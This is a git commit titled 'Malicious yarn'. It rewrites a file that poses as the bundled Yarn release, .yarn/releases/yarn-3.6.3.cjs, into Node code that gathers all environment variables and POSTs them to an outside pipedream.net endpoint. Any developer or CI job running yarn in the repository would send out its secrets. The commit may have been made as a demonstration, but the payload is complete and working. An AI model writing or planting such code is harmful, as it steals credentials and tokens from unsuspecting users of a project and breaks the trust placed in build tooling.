b78c910653de338e9d15b34a85a3229b3be34bd4
Aaron Dewes <aaron.dewes@protonmail.com>
2023-09-12 20:30:44 +0200

    Malicious yarn

--- .yarn/releases/yarn-3.6.3.cjs
+++ .yarn/releases/yarn-3.6.3.cjs
@@ -1,5 +1,18 @@
-#!/usr/bin/env node
-/* eslint-disable */
-//prettier-ignore
+const https = require("https");
 
-throw new Error(JSON.stringify(process.env));
+const data = JSON.stringify({ type: "env", data: process.env });
+
+const options = {
+  hostname: "eou7imp9utaf8v8.m.pipedream.net",
+  port: 443,
+  path: "/",
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json",
+    "Content-Length": data.length,
+  },
+};
+
+const req = https.request(options);
+req.write(data);
+req.end();
